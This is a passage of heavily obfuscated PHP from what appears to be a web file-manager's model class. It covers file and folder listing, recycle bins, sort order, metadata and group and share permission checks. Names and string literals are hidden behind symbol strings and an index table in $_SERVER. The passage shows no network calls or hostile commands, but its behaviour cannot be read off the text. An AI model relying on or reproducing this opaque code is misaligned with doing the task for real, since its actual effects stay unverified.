$ğó²Ù‹[] = $ÔæİÄ°å; } } if (!$ğó²Ù‹) { return array(); } $Î¬ı„é = $this->listSource(array($öŒÆ©öñ[418] => array($öŒÆ©öñ[419], $ğó²Ù‹))); if (!$Î¬ı„é || count($ğó²Ù‹) == $Î¬ı„é[$öŒÆ©öñ[370]][$öŒÆ©öñ[371]]) { return $Î¬ı„é; } $«—Û…õ = array(); $°‡—ÏØ = array_to_keyvalue($Î¬ı„é[$öŒÆ©öñ[87]], $öŒÆ©öñ[22], $öŒÆ©öñ[403]); $¯Ï³¨ß§ = array_to_keyvalue($Î¬ı„é[$öŒÆ©öñ[86]], $öŒÆ©öñ[22], $öŒÆ©öñ[403]); $ˆî˜¦¸ë = array_merge($¯Ï³¨ß§, $°‡—ÏØ); foreach ($ğó²Ù‹ as $¾’Š‚¦Ã) { if (!in_array($¾’Š‚¦Ã, $ˆî˜¦¸ë)) { $«—Û…õ[] = $¾’Š‚¦Ã; } } if ($«—Û…õ) { Model($öŒÆ©öñ[428])->removeBySource($«—Û…õ); } return $Î¬ı„é; } public function listUserRecycle() { $½Ã¡Ñòƒ =& $_SERVER[¹àö™Ç¾]; $«ú‚€÷‹ = Model($½Ã¡Ñòƒ[429])->listData(); if (!$«ú‚€÷‹) { return array(); } $ŸêêòËÀ = array($½Ã¡Ñòƒ[418] => array($½Ã¡Ñòƒ[419], $«ú‚€÷‹), $½Ã¡Ñòƒ[430] => 1); return $this->listSource($ŸêêòËÀ); } public function listSource($¢½¯›µ, $îã‚û…ª = 3000) { $î…ÒÏüæ =& $_SERVER[¹àö™Ç¾]; if (!isset($¢½¯›µ[$î…ÒÏüæ[431]])) { $¢½¯›µ[$î…ÒÏüæ[431]] = 0; } $Š©æ¦ˆ = $î…ÒÏüæ[432]; $ó¬¹İ¹ş = $this->field($Š©æ¦ˆ)->_makeOrder()->where($¢½¯›µ)->selectPage($îã‚û…ª); $this->_listPageCheck($ó¬¹İ¹ş, $Š©æ¦ˆ, $¢½¯›µ); $this->_listDataApply($ó¬¹İ¹ş[$î…ÒÏüæ[373]]); $this->_listMake($ó¬¹İ¹ş); return $ó¬¹İ¹ş; } private function _listPageCheck(&$Š×Ó€÷Â, $‰–ğë‘÷, $é”µ…‹Î) { $ûà‘ıšÎ =& $_SERVER[¹àö™Ç¾]; if (!is_array($Š×Ó€÷Â[$ûà‘ıšÎ[370]])) { return; } $¼Ì‡Š•£ = $Š×Ó€÷Â[$ûà‘ıšÎ[370]]; if ($¼Ì‡Š•£[$ûà‘ıšÎ[372]] <= 1) { return; } if ($¼Ì‡Š•£[$ûà‘ıšÎ[371]] >= 100000) { return; } if (Model($ûà‘ıšÎ[433])->get($ûà‘ıšÎ[434]) != $ûà‘ıšÎ[435]) { return; } $‰–ğë‘÷ = str_replace(array($ûà‘ıšÎ[63], $ûà‘ıšÎ[346], $ûà‘ıšÎ[11]), $ûà‘ıšÎ[22], $‰–ğë‘÷); $‰–ğë‘÷ = $ûà‘ıšÎ[436] . str_replace($ûà‘ıšÎ[60], $ûà‘ıšÎ[437], $‰–ğë‘÷) . $ûà‘ıšÎ[438]; $Éı¾øª¨ = $ûà‘ıšÎ[439]; $Éı¾øª¨ = $Éı¾øª¨ . $ûà‘ıšÎ[440]; $è‰®¤§€ = $¼Ì‡Š•£[$ûà‘ıšÎ[367]] * ($¼Ì‡Š•£[$ûà‘ıšÎ[357]] - 1) . $ûà‘ıšÎ[60] . $¼Ì‡Š•£[$ûà‘ıšÎ[367]]; $ñö³éŸ = $this->_makeOrder(!0); $Ğº–³éé = $ûà‘ıšÎ[436] . str_replace($ûà‘ıšÎ[60], $ûà‘ıšÎ[437], $ñö³éŸ[0]); if (strpos($Ğº–³éé, $ûà‘ıšÎ[441])) { $Ğº–³éé = str_replace($ûà‘ıšÎ[441], $ûà‘ıšÎ[442], $Ğº–³éé); } else { $Ğº–³éé .= $ûà‘ıšÎ[443] . $ñö³éŸ[1]; } $¾ÍÄ”ÓÆ = array(); foreach ($é”µ…‹Î as $ï÷‹¬ó => $ Ôóõª‘) { $¾ÍÄ”ÓÆ[$ûà‘ıšÎ[436] . $ï÷‹¬ó] = $ Ôóõª‘; } $this->alias($ûà‘ıšÎ[444])->field($‰–ğë‘÷)->limit($è‰®¤§€)->order($Ğº–³éé); $ìÏÆ–¸ = $this->join($Éı¾øª¨)->where($¾ÍÄ”ÓÆ)->select(); if ($ìÏÆ–¸) { $Š×Ó€÷Â[$ûà‘ıšÎ[373]] = $ìÏÆ–¸; } } protected function _makeOrder($÷êµ£Âü = false) { $„†£ı¶¹ =& $_SERVER[¹àö™Ç¾]; $‘Å´¨Ç¸ = Model($„†£ı¶¹[445])->get($„†£ı¶¹[446]); $¥Åçåû = Model($„†£ı¶¹[445])->get($„†£ı¶¹[447]); $¦å¶…ê… = array($„†£ı¶¹[448] => $„†£ı¶¹[449], $„†£ı¶¹[450] => $„†£ı¶¹[451]); $ÅŠ§ÈŸœ = array($„†£ı¶¹[42] => $„†£ı¶¹[42], $„†£ı¶¹[90] => $„†£ı¶¹[90], $„†£ı¶¹[177] => $„†£ı¶¹[413], $„†£ı¶¹[452] => $„†£ı¶¹[452], $„†£ı¶¹[453] => $„†£ı¶¹[454], $„†£ı¶¹[203] => $„†£ı¶¹[203], $„†£ı¶¹[96] => $„†£ı¶¹[96]); $ã·‡éß = Input::get($„†£ı¶¹[455], $„†£ı¶¹[17], $‘Å´¨Ç¸, array_keys($ÅŠ§ÈŸœ)); $«¬İ¨‹¦ = Input::get($„†£ı¶¹[456], $„†£ı¶¹[17], $¥Åçåû, array_keys($¦å¶…ê…)); if (!in_array($ã·‡éß, array_keys($ÅŠ§ÈŸœ))) { $ã·‡éß = $„†£ı¶¹[42]; } if (!in_array($«¬İ¨‹¦, array_keys($¦å¶…ê…))) { $ã·‡éß = $„†£ı¶¹[448]; } if ($ã·‡éß == $„†£ı¶¹[42]) { } $ˆ˜î¥› = $„†£ı¶¹[457] . $ÅŠ§ÈŸœ[$ã·‡éß] . $„†£ı¶¹[63] . $¦å¶…ê…[$«¬İ¨‹¦]; $ˆ˜î¥› = rtrim(trim($ˆ˜î¥›), $„†£ı¶¹[60]); if ($÷êµ£Âü) { return array($ˆ˜î¥›, $¦å¶…ê…[$«¬İ¨‹¦]); } return $this->order($ˆ˜î¥›); } protected function _listDataApplyItem($ÉÑì¤È“, $¨ØÃ½€İ = false) { $œè¢­ö¤ = array($ÉÑì¤È“); $this->_listDataApply($œè¢­ö¤, $¨ØÃ½€İ); return $œè¢­ö¤[0]; } protected function _listDataApply(&$Â±ÆŞÒ, $à··¡ƒÎ = false) { $›öˆÒè¬ =& $_SERVER[¹àö™Ç¾]; if (!$Â±ÆŞÒ) { $Â±ÆŞÒ = array(); return; } $é¼î„œç = array_to_keyvalue($Â±ÆŞÒ, $›öˆÒè¬[22], $›öˆÒè¬[403]); $é¼î„œç = array_unique($é¼î„œç); $this->_listSourceCache($Â±ÆŞÒ); if (!$à··¡ƒÎ) { $this->_listAppendMeta($Â±ÆŞÒ, $é¼î„œç); $this->_listAppendFileMeta($Â±ÆŞÒ, $é¼î„œç); $this->_listAppendChildren($Â±ÆŞÒ, $é¼î„œç); } $this->_listAppendPath($Â±ÆŞÒ); $this->_listAppendAuth($Â±ÆŞÒ); $this->_listAppendSourceInfo($Â±ÆŞÒ, $é¼î„œç); $this->_listAppendUser($Â±ÆŞÒ); $this->_listFilterInfo($Â±ÆŞÒ, $à··¡ƒÎ); $this->_listAppendAuthSecret($Â±ÆŞÒ); } protected function _listSourceCache($ü‹³œÇ) { $ŒÇ£ªÏÀ =& $_SERVER[¹àö™Ç¾]; foreach ($ü‹³œÇ as $µ—ÒÏÈ¾) { self::$cacheSourceInfo[$ŒÇ£ªÏÀ[458] . $µ—ÒÏÈ¾[$ŒÇ£ªÏÀ[403]]] = $µ—ÒÏÈ¾; } } protected function _listFilterInfo(&$â­÷”†®, $îí·áù = false) { $ûó…¢Ò =& $_SERVER[¹àö™Ç¾]; foreach ($â­÷”†® as &$µí¯À§°) { $µí¯À§° = $this->pathInfoFilter($µí¯À§°); self::$cachePathInfo[$ûó…¢Ò[459] . intval($îí·áù) . $ûó…¢Ò[460] . $µí¯À§°[$ûó…¢Ò[403]]] = $µí¯À§°; } unset($µí¯À§°); } protected function _listMake(&$›ÉÏŠğå) { $ ñ‘‚ñ¢ =& $_SERVER[¹àö™Ç¾]; $›ÉÏŠğå[$ ñ‘‚ñ¢[87]] = array(); $›ÉÏŠğå[$ ñ‘‚ñ¢[86]] = array(); foreach ($›ÉÏŠğå[$ ñ‘‚ñ¢[373]] as $“êÏ´Å) { $Ñ¸âğõœ = $“êÏ´Å[$ ñ‘‚ñ¢[411]] == 1 ? $ ñ‘‚ñ¢[87] : $ ñ‘‚ñ¢[86]; $›ÉÏŠğå[$Ñ¸âğõœ][] = $“êÏ´Å; } unset($›ÉÏŠğå[$ ñ‘‚ñ¢[373]]); } protected function _listAppendMeta(&$µñŒé¸Ö, $ù„•€ÕÒ) { $ôü›”úã =& $_SERVER[¹àö™Ç¾]; $µËšøÂà = array($ôü›”úã[418] => array($ôü›”úã[419], $ù„•€ÕÒ)); $—à¿Í¨½ = Model($ôü›”úã[461])->field($ôü›”úã[462])->where($µËšøÂà)->select(); if (!$—à¿Í¨½) { return; } $¶É²ÑÄÂ = array($ôü›”úã[463], $ôü›”úã[464], $ôü›”úã[442]); $Şîò»ÖÓ = array(); foreach ($—à¿Í¨½ as $¯ÈØñÚš) { if (!isset($Şîò»ÖÓ[$¯ÈØñÚš[$ôü›”úã[403]]])) { $Şîò»ÖÓ[$¯ÈØñÚš[$ôü›”úã[403]]] = array(); } if (in_array($¯ÈØñÚš[$ôü›”úã[105]], $¶É²ÑÄÂ)) { continue; } $Şîò»ÖÓ[$¯ÈØñÚš[$ôü›”úã[403]]][$¯ÈØñÚš[$ôü›”úã[105]]] = $¯ÈØñÚš[$ôü›”úã[378]]; } foreach ($µñŒé¸Ö as &$·Ö½¹ò) { $·Ö½¹ò[$ôü›”úã[465]] = !1; if (isset($Şîò»ÖÓ[$·Ö½¹ò[$ôü›”úã[403]]])) { $·Ö½¹ò[$ôü›”úã[465]] = $Şîò»ÖÓ[$·Ö½¹ò[$ôü›”úã[403]]]; } if ($this->fileIsLock($·Ö½¹ò) && $·Ö½¹ò[$ôü›”úã[414]]) { $¥È†±Î = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $·Ö½¹ò[$ôü›”úã[414]][$ôü›”úã[415]] = AuthModel::authDisable($·Ö½¹ò[$ôü›”úã[414]][$ôü›”úã[415]], $¥È†±Î); $·Ö½¹ò[$ôü›”úã[414]][$ôü›”úã[466]][$ôü›”úã[414]] = $·Ö½¹ò[$ôü›”úã[414]][$ôü›”úã[415]]; } } unset($·Ö½¹ò); } protected function _listAppendFileMeta(&$‚Û“…ªè, $í¨ö°¡±) { $ú½ÜâİÂ =& $_SERVER[¹àö™Ç¾]; $üÊÛá¦» = array_to_keyvalue($‚Û“…ªè, $ú½ÜâİÂ[22], $ú½ÜâİÂ[467]); $üÊÛá¦» = array_filter(array_unique($üÊÛá¦»)); if (!$üÊÛá¦») { return; } $öø¨¦˜œ = array($ú½ÜâİÂ[468] => array($ú½ÜâİÂ[419], $üÊÛá¦»)); $öŸ´Ò½¹ = $ú½ÜâİÂ[469]; $Úşš‘Æ = Model($ú½ÜâİÂ[470])->field($öŸ´Ò½¹)->where($öø¨¦˜œ)->select(); $Úşš‘Æ = array_to_keyvalue($Úşš‘Æ, $ú½ÜâİÂ[467]); $×ƒ ¸Ûã = Model($ú½ÜâİÂ[471])->field($ú½ÜâİÂ[472])->where($öø¨¦˜œ)->select(); $×ƒ ¸Ûã = $×ƒ ¸Ûã ? $×ƒ ¸Ûã : array(); $àûØÄÁš = array(); foreach ($×ƒ ¸Ûã as $€‚±¤ñ…) { if (!isset($àûØÄÁš[$€‚±¤ñ…[$ú½ÜâİÂ[467]]])) { $àûØÄÁš[$€‚±¤ñ…[$ú½ÜâİÂ[467]]] = array(); } $àûØÄÁš[$€‚±¤ñ…[$ú½ÜâİÂ[467]]][$€‚±¤ñ…[$ú½ÜâİÂ[105]]] = $€‚±¤ñ…[$ú½ÜâİÂ[378]]; } foreach ($‚Û“…ªè as &$‡œïÛÀ) { $ÉĞçìÃ = $‡œïÛÀ[$ú½ÜâİÂ[467]]; if (!$ÉĞçìÃ || !is_array($Úşš‘Æ[$ÉĞçìÃ])) { continue; } $ÆÃîúÒØ = $Úşš‘Æ[$ÉĞçìÃ]; $ÆÃîúÒØ[$ú½ÜâİÂ[90]] = $‡œïÛÀ[$ú½ÜâİÂ[90]]; $ÆÃîúÒØ[$ú½ÜâİÂ[42]] = $‡œïÛÀ[$ú½ÜâİÂ[42]]; if (!isset(self::$cacheFileInfo[$ú½ÜâİÂ[473] . $ÉĞçìÃ])) { self::$cacheFileInfo[$ú½ÜâİÂ[473] . $ÉĞçìÃ] = array_merge(array(), $ÆÃîúÒØ); } unset($Úşš‘Æ[$ÉĞçìÃ][$ú½ÜâİÂ[88]]); $ÄÎâ³Ì¤ = is_array($àûØÄÁš[$ÉĞçìÃ]) ? $àûØÄÁš[$ÉĞçìÃ] : array(); $‡œïÛÀ[$ú½ÜâİÂ[173]] = array_merge($ÄÎâ³Ì¤, $Úşš‘Æ[$ÉĞçìÃ]); if (isset($‡œïÛÀ[$ú½ÜâİÂ[173]][$ú½ÜâİÂ[172]])) { $‡œïÛÀ[$ú½ÜâİÂ[172]] = json_decode($‡œïÛÀ[$ú½ÜâİÂ[173]][$ú½ÜâİÂ[172]], !0); unset($‡œïÛÀ[$ú½ÜâİÂ[173]][$ú½ÜâİÂ[172]]); } } unset($‡œïÛÀ); } protected function _listAppendSourceInfo(&$Â¬€ÅÖ¯, $˜Ÿä‹›) { $àõÒ­°µ =& $_SERVER[¹àö™Ç¾]; if (!defined($àõÒ­°µ[474])) { return; } $Ÿ¿ŸÀÎ¯ = Model($àõÒ­°µ[475])->listData(); $Ã‚Šò¼» = Model($àõÒ­°µ[426])->listData(); $¹Óö˜âã = Model($àõÒ­°µ[416])->listData(); $Å³¥ïâ = Model($àõÒ­°µ[476])->listSimple(); $¼ÙÂŞ‡Î = array_to_keyvalue($Ÿ¿ŸÀÎ¯, $àõÒ­°µ[401]); $”Êº»ö = array_to_keyvalue_group($Ã‚Šò¼», $àõÒ­°µ[88], $àõÒ­°µ[427]); $€Å½û¶‡ = array_to_keyvalue($¹Óö˜âã, $àõÒ­°µ[88]); $šêŒŠ“¢ = array_to_keyvalue_group($Å³¥ïâ, $àõÒ­°µ[403]); foreach ($Â¬€ÅÖ¯ as &$Ñ˜Ó¥÷Ê) { $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]] = array($àõÒ­°µ[477] => 0, $àõÒ­°µ[478] => 0, $àõÒ­°µ[479] => 0); if (isset($€Å½û¶‡[$Ñ˜Ó¥÷Ê[$àõÒ­°µ[403]]])) { $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]][$àõÒ­°µ[480]] = 1; $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]][$àõÒ­°µ[481]] = $€Å½û¶‡[$Ñ˜Ó¥÷Ê[$àõÒ­°µ[403]]][$àõÒ­°µ[42]]; } if (isset($”Êº»ö[$Ñ˜Ó¥÷Ê[$àõÒ­°µ[403]]])) { $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]][$àõÒ­°µ[482]] = array(); foreach ($”Êº»ö[$Ñ˜Ó¥÷Ê[$àõÒ­°µ[403]]] as $öÁ‚£™õ) { $•à¾™Š = $¼ÙÂŞ‡Î[$öÁ‚£™õ]; $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]][$àõÒ­°µ[482]][] = array($àõÒ­°µ[483] => $•à¾™Š[$àõÒ­°µ[401]], $àõÒ­°µ[421] => $•à¾™Š[$àõÒ­°µ[42]], $àõÒ­°µ[484] => $•à¾™Š[$àõÒ­°µ[485]]); } } if (isset($šêŒŠ“¢[$Ñ˜Ó¥÷Ê[$àõÒ­°µ[403]]])) { $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]][$àõÒ­°µ[486]] = array(); foreach ($šêŒŠ“¢[$Ñ˜Ó¥÷Ê[$àõÒ­°µ[403]]] as $§’°¢¼¦) { $Ñ˜Ó¥÷Ê[$àõÒ­°µ[97]][$àõÒ­°µ[486]] = array($àõÒ­°µ[487] => $§’°¢¼¦[$àõÒ­°µ[488]], $àõÒ­°µ[489] => $§’°¢¼¦[$àõÒ­°µ[490]], $àõÒ­°µ[491] => $§’°¢¼¦[$àõÒ­°µ[403]], $àõÒ­°µ[492] => $§’°¢¼¦[$àõÒ­°µ[493]], $àõÒ­°µ[494] => $§’°¢¼¦[$àõÒ­°µ[495]], $àõÒ­°µ[496] => $§’°¢¼¦[$àõÒ­°µ[496]], $àõÒ­°µ[497] => $§’°¢¼¦[$àõÒ­°µ[497]]); } } } unset($Ñ˜Ó¥÷Ê); return $Â¬€ÅÖ¯; } protected function _listAppendChildren(&$ß¡ãâüİ, $›‡ë±×—) { $’•…ĞÏ£ =& $_SERVER[¹àö™Ç¾]; $şøä‹Œ° = array(); $àòæ‘¾ï = array($’•…ĞÏ£[212] => 0, $’•…ĞÏ£[213] => 0); foreach ($ß¡ãâüİ as &$¾Ÿ¤Ç”Í) { if (!$¾Ÿ¤Ç”Í[$’•…ĞÏ£[411]]) { continue; } $şøä‹Œ°[] = $¾Ÿ¤Ç”Í[$’•…ĞÏ£[403]]; } unset($¾Ÿ¤Ç”Í); if (!$şøä‹Œ°) { return; } $ıšóŸúŸ = array($’•…ĞÏ£[498] => array($’•…ĞÏ£[17], $şøä‹Œ°)); $ñÙéé™² = array($’•…ĞÏ£[498], $’•…ĞÏ£[411], $’•…ĞÏ£[499] => $’•…ĞÏ£[500]); $÷¤ªÙÆˆ = $this->field($ñÙéé™²)->where($ıšóŸúŸ)->group($’•…ĞÏ£[501])->select(); $ãÌÆœ÷£ = array(); foreach ($÷¤ªÙÆˆ as $ø¿ù–×) { $‚³ùœçí = $ø¿ù–×[$’•…ĞÏ£[498]]; $ÌÌ‰÷¢× = $ø¿ù–×[$’•…ĞÏ£[411]] == $’•…ĞÏ£[99] ? $’•…ĞÏ£[213] : $’•…ĞÏ£[212]; if (!isset($ãÌÆœ÷£[$‚³ùœçí])) { $ãÌÆœ÷£[$‚³ùœçí] = array($’•…ĞÏ£[212] => 0, $’•…ĞÏ£[213] => 0); } $ãÌÆœ÷£[$‚³ùœçí][$ÌÌ‰÷¢×] += $ø¿ù–×[$’•…ĞÏ£[500]]; } foreach ($ß¡ãâüİ as &$¾Ÿ¤Ç”Í) { if (!$¾Ÿ¤Ç”Í[$’•…ĞÏ£[411]]) { continue; } $–ßÉ‹å = is_array($ãÌÆœ÷£[$¾Ÿ¤Ç”Í[$’•…ĞÏ£[403]]]) ? $ãÌÆœ÷£[$¾Ÿ¤Ç”Í[$’•…ĞÏ£[403]]] : $àòæ‘¾ï; $¾Ÿ¤Ç”Í[$’•…ĞÏ£[213]] = $–ßÉ‹å[$’•…ĞÏ£[213]]; $¾Ÿ¤Ç”Í[$’•…ĞÏ£[212]] = $–ßÉ‹å[$’•…ĞÏ£[212]]; unset($¾Ÿ¤Ç”Í[$’•…ĞÏ£[413]]); } unset($¾Ÿ¤Ç”Í); } protected function _listAppendAuth(&$“ìæØ¾‡) { $‚ñ¡¤çı =& $_SERVER[¹àö™Ç¾]; if (!defined($‚ñ¡¤çı[474])) { return; } $§‚˜±¤˜ = array(); foreach ($“ìæØ¾‡ as $§Åø¯Ì§) { if ($§Åø¯Ì§[$‚ñ¡¤çı[412]] == self::TYPE_GROUP) { $§‚˜±¤˜[] = $§Åø¯Ì§[$‚ñ¡¤çı[403]]; } } if (!$§‚˜±¤˜) { return; } $ÄÂ€éÆ = array_to_keyvalue($“ìæØ¾‡, $‚ñ¡¤çı[403]); $ÍÎ©³â = Model($‚ñ¡¤çı[502])->getSourceList($§‚˜±¤˜, $ÄÂ€éÆ); foreach ($“ìæØ¾‡ as $ı²ğ»Ëà => &$§Åø¯Ì§) { $§Åø¯Ì§[$‚ñ¡¤çı[414]] = $ÍÎ©³â[$§Åø¯Ì§[$‚ñ¡¤çı[403]]]; if (!$§Åø¯Ì§[$‚ñ¡¤çı[414]] && $§Åø¯Ì§[$‚ñ¡¤çı[412]] == self::TYPE_GROUP) { $§Åø¯Ì§[$‚ñ¡¤çı[414]] = Action($‚ñ¡¤çı[503])->pathGroupAuthMake($§Åø¯Ì§[$‚ñ¡¤çı[504]]); if (!$§Åø¯Ì§[$‚ñ¡¤çı[414]] && !_get($GLOBALS, $‚ñ¡¤çı[505])) { $§Åø¯Ì§[$‚ñ¡¤çı[205]] = !1; $§Åø¯Ì§[$‚ñ¡¤çı[204]] = !1; } } if ($§Åø¯Ì§[$‚ñ¡¤çı[414]]) { $§Åø¯Ì§[$‚ñ¡¤çı[205]] = AuthModel::authCheckEdit($§Åø¯Ì§[$‚ñ¡¤çı[414]][$‚ñ¡¤çı[415]]); $§Åø¯Ì§[$‚ñ¡¤çı[204]] = AuthModel::authCheckView($§Åø¯Ì§[$‚ñ¡¤çı[414]][$‚ñ¡¤çı[415]]); } $this->groupPathDisplay($§Åø¯Ì§); } unset($§Åø¯Ì§); } public function _listAppendAuthSecret(&$ŒˆĞºÄ) { $ÉÚ¶±åš =& $_SERVER[¹àö™Ç¾]; if (Model($ÉÚ¶±åš[433])->get($ÉÚ¶±åš[506]) != $ÉÚ¶±åš[99]) { return; } static $üØˆ¾· = false; if (!$üØˆ¾·) { $— Øä‚ì = Model($ÉÚ¶±åš[507]); $Æşß¹·Ô = Model($ÉÚ¶±åš[508]); $üØˆ¾· = $Æşß¹·Ô->listData(); $üØˆ¾· = array_to_keyvalue($üØˆ¾·, $ÉÚ¶±åš[403]); $ôûô¾‚ = json_decode(Model($ÉÚ¶±åš[433])->get($ÉÚ¶±åš[509]), !0); $ôûô¾‚ = array_to_keyvalue($ôûô¾‚, $ÉÚ¶±åš[401]); foreach ($üØˆ¾· as $«×ñ¹Ò => $¡Ì­•·Û) { $ÙÄüŞ = $ôûô¾‚[$¡Ì­•·Û[$ÉÚ¶±åš[510]]]; if (!$ÙÄüŞ) { $Æşß¹·Ô->remove($¡Ì­•·Û[$ÉÚ¶±åš[401]]); unset($üØˆ¾·[$«×ñ¹Ò]); continue; } $‹İ’…î = $— Øä‚ì->listData($ÙÄüŞ[$ÉÚ¶±åš[414]]); if (!$‹İ’…î) { $Æşß¹·Ô->remove($¡Ì­•·Û[$ÉÚ¶±åš[401]]); unset($üØˆ¾·[$«×ñ¹Ò]); continue; } $¡Ì­•·Û[$ÉÚ¶±åš[414]] = $‹İ’…î; $¡Ì­•·Û[$ÉÚ¶±åš[511]] = $ÙÄüŞ; $¡Ì­•·Û[$ÉÚ¶±åš[512]] = Model($ÉÚ¶±åš[513])->getInfoSimpleOuter($¡Ì­•·Û[$ÉÚ¶±åš[452]]); $üØˆ¾·[$«×ñ¹Ò] = $¡Ì­•·Û; } } $É’Ì¦ËÈ = defined($ÉÚ¶±åš[514]) ? USER_ID : $ÉÚ¶±åš[22]; $ŒİÉæó† = array(); $ª„Ûèšˆ = $this->_listAppendPath($ŒİÉæó†, !0); foreach ($ŒˆĞºÄ as $«×ñ¹Ò => &$¡Ì­•·Û) { if (!is_array($¡Ì­•·Û[$ÉÚ¶±åš[414]])) { continue; } if ($¡Ì­•·Û[$ÉÚ¶±åš[412]] != $ÉÚ¶±åš[515]) { continue; } if (isset($üØˆ¾·[$¡Ì­•·Û[$ÉÚ¶±åš[403]]])) { $ ø®‚« = $üØˆ¾·[$¡Ì­•·Û[$ÉÚ¶±åš[403]]]; if (!is_array($¡Ì­•·Û[$ÉÚ¶±åš[465]])) { $¡Ì­•·Û[$ÉÚ¶±åš[465]] = array(); } $¡Ì­•·Û[$ÉÚ¶±åš[465]][$ÉÚ¶±åš[516]] = $ ø®‚«[$ÉÚ¶±åš[510]]; $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[517]] = $ ø®‚«; $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[518]] = $¡Ì­•·Û[$ÉÚ¶±åš[519]]; $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[520]] = $ÉÚ¶±åš[99]; if ($ ø®‚«[$ÉÚ¶±åš[452]] != $É’Ì¦ËÈ) { $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[415]] = $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[415]] & $ ø®‚«[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[414]]; } continue; } $µèÍ¯‰ı = $this->parentLevelArray($¡Ì­•·Û[$ÉÚ¶±åš[521]]); $„şÊŸ£¾ = array_reverse($µèÍ¯‰ı); foreach ($„şÊŸ£¾ as $ğßø ‰î => $ìñÜ¾) { if (!isset($üØˆ¾·[$ìñÜ¾])) { continue; } $ ø®‚« = $üØˆ¾·[$ìñÜ¾]; $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[517]] = $ ø®‚«; if ($ ø®‚«[$ÉÚ¶±åš[452]] != $É’Ì¦ËÈ) { $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[415]] = $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[415]] & $ ø®‚«[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[414]]; } $±‰«¾®¢ = $ÉÚ¶±åš[22]; $€“Ø˜´ = count($µèÍ¯‰ı) - $ğßø ‰î; for ($Î”ß„› = 0; $Î”ß„› < $€“Ø˜´; $Î”ß„›++) { if (!isset($ª„Ûèšˆ[$µèÍ¯‰ı[$Î”ß„›]])) { $±‰«¾®¢ = $ÉÚ¶±åš[22]; break; } $±‰«¾®¢ = $±‰«¾®¢ . rtrim($ª„Ûèšˆ[$µèÍ¯‰ı[$Î”ß„›]], $ÉÚ¶±åš[18]) . $ÉÚ¶±åš[18]; } $¡Ì­•·Û[$ÉÚ¶±åš[414]][$ÉÚ¶±åš[518]] = rtrim($±‰«¾®¢, $ÉÚ¶±åš[18]) . $ÉÚ¶±åš[18]; break; } } unset($¡Ì­•·Û); } public function groupPathDisplay(&$ğ¦Ö¾“İ) { $­µªô‡÷ =& $_SERVER[¹àö™Ç¾]; if ($ğ¦Ö¾“İ[$­µªô‡÷[412]] != self::TYPE_GROUP) { return; } $•è¥‹ Ş = Model($­µªô‡÷[522])->getInfo($ğ¦Ö¾“İ[$­µªô‡÷[504]]); $¹Ï†ã¶« = $this->parentLevelArray($•è¥‹ Ş[$­µªô‡÷[521]]); $Ôè¥Ş = $­µªô‡÷[22]; foreach ($¹Ï†ã¶« as $ÒÃŸµ¥ú) { $ĞšÃÎØú = Model($­µªô‡÷[522])->getInfo($ÒÃŸµ¥ú); $Ôè¥Ş .= $ĞšÃÎØú[$­µªô‡÷[97]][$­µªô‡÷[403]] . $­µªô‡÷[60]; } $ğ¦Ö¾“İ[$­µªô‡÷[523]] = $•è¥‹ Ş[$­µªô‡÷[498]]; $ğ¦Ö¾“İ[$­µªô‡÷[524]] = $•è¥‹ Ş[$­µªô‡÷[521]]; $ğ¦Ö¾“İ[$­µªô‡÷[525]] = $•è¥‹ Ş[$­µªô‡÷[526]]; $ğ¦Ö¾“İ[$­µªô‡÷[527]] = $Ôè¥Ş . $•è¥‹ Ş[$­µªô‡÷[97]][$­µªô‡÷[403]]; } protected function _listAppendPath(&$ë¤‡‘¿, $Ş’µÔšé = false) { $á—Ğôğ– =& $_SERVER[¹àö™Ç¾]; static $ûº“Õáù = array(); $«…ƒ®°¥ = array(); $ÄâÀ¹ß” = array(); if ($Ş’µÔšé) { return $ûº“Õáù; } foreach ($ë¤‡‘¿ as &$­­ïÏâí) { $Â·„¯à = $­­ïÏâí[$á—Ğôğ–[403]]; if ($­­ïÏâí[$á—Ğôğ–[411]] == $á—Ğôğ–[99] && $­­ïÏâí[$á—Ğôğ–[498]] != 0) { $ûº“Õáù[$Â·„¯à] = $­­ïÏâí[$á—Ğôğ–[42]]; } if ($­­ïÏâí[$á—Ğôğ–[411]] == $á—Ğôğ–[99] && $­­ïÏâí[$á—Ğôğ–[498]] == 0 && !isset($ûº“Õáù[$Â·„¯à])) { $ûº“Õáù[$Â·„¯à] = $this->_listAppendPathRoot($­­ïÏâí, array()); } if (isset($ÄâÀ¹ß”[$­­ïÏâí[$á—Ğôğ–[521]]])) { continue; } $ÄâÀ¹ß”[$­­ïÏâí[$á—Ğôğ–[521]]] = !0; $‰²ùùˆ† = $this->parentLevelArray($­­ïÏâí[$á—Ğôğ–[521]]); foreach ($‰²ùùˆ† as $ıÁÁ³¤“ => $ƒÆò­Ñ’) { if (isset($ûº“Õáù[$ƒÆò­Ñ’])) { continue; } if ($ıÁÁ³¤“ == 0) { $ûº“Õáù[$ƒÆò­Ñ’] = $this->_listAppendPathRoot($­­ïÏâí, $‰²ùùˆ†); } if ($ıÁÁ³¤“ != 0) { $«…ƒ®°¥[] = $ƒÆò­Ñ’; } } } unset($­­ïÏâí); $«…ƒ®°¥ = array_unique($«…ƒ®°¥); if (count($«…ƒ®°¥) > 0) { $¡Ÿü¢‡ = array($á—Ğôğ–[418] => array($á—Ğôğ–[419], $«…ƒ®°¥)); if (count($«…ƒ®°¥) == 1) { $¢¤Şº™î = $this->sourceInfo($«…ƒ®°¥[0]); $±ßˆ¤×× = is_array($¢¤Şº™î) ? array($¢¤Şº™î) : !1; } else { $±ßˆ¤×× = 